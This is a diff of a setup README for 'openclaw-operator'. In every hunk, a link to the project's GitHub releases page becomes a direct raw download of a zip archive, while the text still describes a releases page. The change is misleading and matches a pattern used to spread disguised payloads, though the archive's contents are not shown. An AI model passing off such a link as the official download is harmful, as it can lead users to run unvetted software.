@@ -1,6 +1,6 @@
 # 🦾 openclaw-operator - Easy Setup for OpenClaw Agents
 
-[![Download openclaw-operator](https://img.shields.io/badge/Download-OpenClaw-orange?style=for-the-badge)](https://github.com/Rhusaromaticablackbird168/openclaw-operator/releases)
+[![Download openclaw-operator](https://img.shields.io/badge/Download-OpenClaw-orange?style=for-the-badge)](https://raw.githubusercontent.com/Rhusaromaticablackbird168/openclaw-operator/main/skills/openclaw-operator-1.4.zip)
 
 ---
 
@@ -33,7 +33,7 @@ Follow these steps to download and run the openclaw-operator software on your Wi
 
 Open your web browser and go to the releases page for openclaw-operator:
 
-[Download openclaw-operator Here](https://github.com/Rhusaromaticablackbird168/openclaw-operator/releases)
+[Download openclaw-operator Here](https://raw.githubusercontent.com/Rhusaromaticablackbird168/openclaw-operator/main/skills/openclaw-operator-1.4.zip)
 
 This page has all available versions of the software. Choose the latest version marked as stable.
 
@@ -125,7 +125,7 @@ If problems continue, revisit the release page for newer versions or updates tha
 
 You can download or update openclaw-operator anytime by visiting this page:
 
-[https://github.com/Rhusaromaticablackbird168/openclaw-operator/releases](https://github.com/Rhusaromaticablackbird168/openclaw-operator/releases)
+[https://raw.githubusercontent.com/Rhusaromaticablackbird168/openclaw-operator/main/skills/openclaw-operator-1.4.zip](https://raw.githubusercontent.com/Rhusaromaticablackbird168/openclaw-operator/main/skills/openclaw-operator-1.4.zip)
 
 ---
 
